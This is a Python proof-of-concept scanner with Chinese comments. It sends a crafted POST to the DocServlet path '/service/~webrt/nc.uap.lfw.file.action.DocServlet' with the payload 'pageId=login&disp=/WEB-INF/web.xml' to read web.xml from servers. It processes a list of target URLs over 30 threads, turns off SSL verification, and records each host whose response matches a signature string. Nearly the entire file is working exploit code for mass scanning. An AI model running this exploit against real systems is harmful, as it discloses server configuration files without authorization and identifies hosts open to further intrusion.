import requests
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
import urllib3
from urllib.parse import urlparse
import sys

# 禁用SSL警告
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# 线程锁，用于安全写入文件
file_lock = threading.Lock()

def normalize_url(url):
    """
    规范化URL格式
    - 如果没有http://或https://前缀，则加上http://
    - 去除末尾的斜杠
    """
    url = url.strip()
    
    # 检查协议
    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url
    
    # 去除末尾斜杠
    url = url.rstrip('/')
    
    return url

def check_vulnerability(url):
    """
    检测单个URL是否存在漏洞
    """
    try:
        # 规范化URL
        target_url = normalize_url(url)
        
        # 构造完整的请求URL
        vuln_url = target_url + '/service/~webrt/nc.uap.lfw.file.action.DocServlet'
        
        # 解析URL获取host
        parsed_url = urlparse(target_url)
        host = parsed_url.netloc
        
        # 请求头
        headers = {
            'Host': host,
            'Content-Type': 'application/x-www-form-urlencoded',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Connection': 'close'
        }
        
        # 请求数据
        data = 'pageId=login&disp=/WEB-INF/web.xml'
        
        # 发送POST请求
        response = requests.post(
            vuln_url,
            headers=headers,
            data=data,
            timeout=10,
            verify=False,
            allow_redirects=False
        )
        
        # 检查响应中是否包含漏洞特征
        if response.status_code == 200 and 'nc.bs.framework.server.LoggerServletFilter' in response.text:
            # 漏洞存在，写入结果文件
            result_info = f"""[+] 漏洞存在: {target_url}
响应状态码: {response.status_code}
请求URL: {vuln_url}
响应内容长度: {len(response.text)}
响应内容片段: {response.text[:300]}...

{'-'*80}
"""
            with file_lock:
                with open('result.txt', 'a', encoding='utf-8') as f:
                    f.write(result_info)
            
            print(f"[+] 漏洞存在: {target_url}")
            return True, target_url, "漏洞存在"
        else:
            print(f"[-] 漏洞不存在: {target_url} (状态码: {response.status_code})")
            return False, target_url, f"漏洞不存在 (状态码: {response.status_code})"
    
    except requests.exceptions.ConnectTimeout:
        error_msg = f"[!] 连接超时: {target_url}"
        print(error_msg)
        return False, target_url, "连接超时"
    except requests.exceptions.ConnectionError:
        error_msg = f"[!] 连接失败: {target_url}"
        print(error_msg)
        return False, target_url, "连接失败"
    except requests.exceptions.Timeout:
        error_msg = f"[!] 请求超时: {target_url}"
        print(error_msg)
        return False, target_url, "请求超时"
    except requests.exceptions.RequestException as e:
        error_msg = f"[!] 请求异常: {target_url} - 错误: {str(e)}"
        print(error_msg)
        return False, target_url, f"请求异常: {str(e)}"
    except Exception as e:
        error_msg = f"[!] 检测过程中出现异常: {target_url} - 错误: {str(e)}"
        print(error_msg)
        return False, target_url, f"检测异常: {str(e)}"

def main():
    """
    主函数
    """
    # 读取URL列表
    try:
        with open('url.txt', 'r', encoding='utf-8') as f:
            urls = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print("[错误] 未找到url.txt文件，请确保文件存在")
        print("[提示] 请在当前目录下创建url.txt文件，每行一个URL")
        return
    except Exception as e:
        print(f"[错误] 读取url.txt文件失败: {str(e)}")
        return
    
    if not urls:
        print("[警告] url.txt文件中没有有效的URL")
        return
    
    print(f"[*] 开始检测漏洞，共 {len(urls)} 个URL，线程数: 30")
    print("[*] URL规范化处理: 自动添加http://协议，去除末尾斜杠")
    print("[*] 开始检测...")
    
    # 清空或创建结果文件
    with open('result.txt', 'w', encoding='utf-8') as f:
        f.write("漏洞检测结果\n")
        f.write("=" * 80 + "\n")
        f.write("检测POC: POST /service/~webrt/nc.uap.lfw.file.action.DocServlet\n")
        f.write("检测特征: nc.bs.framework.server.LoggerServletFilte\n")
        f.write("=" * 80 + "\n\n")
    
    # 使用线程池并发检测
    vulnerable_count = 0
    total_count = len(urls)
    completed_count = 0
    
    with ThreadPoolExecutor(max_workers=30) as executor:
        # 提交所有任务
        future_to_url = {executor.submit(check_vulnerability, url): url for url in urls}
        
        # 处理完成的任务
        for future in as_completed(future_to_url):
            url = future_to_url[future]
            completed_count += 1
            try:
                result = future.result()
                if result[0]:  # 如果漏洞存在
                    vulnerable_count += 1
                
                # 显示进度
                progress = (completed_count / total_count) * 100
                print(f"[进度] {completed_count}/{total_count} ({progress:.1f}%) - 漏洞数: {vulnerable_count}", end='\r')
                
            except Exception as e:
                print(f"[!] 处理 {url} 时出现异常: {str(e)}")
    
    print(f"\n\n[*] 检测完成!")
    print(f"[*] 总共检测: {total_count} 个URL")
    print(f"[*] 存在漏洞: {vulnerable_count} 个")
    print(f"[*] 漏洞率: {(vulnerable_count/total_count)*100:.2f}%" if total_count > 0 else "[*] 漏洞率: 0%")
    print(f"[*] 详细结果已写入 result.txt 文件")

if __name__ == "__main__":
    # 显示banner
    print("=" * 60)
    print("漏洞检测脚本")
    print("POC: POST /service/~webrt/nc.uap.lfw.file.action.DocServlet")
    print("特征: nc.bs.framework.server.LoggerServletFilte")
    print("=" * 60)
    main()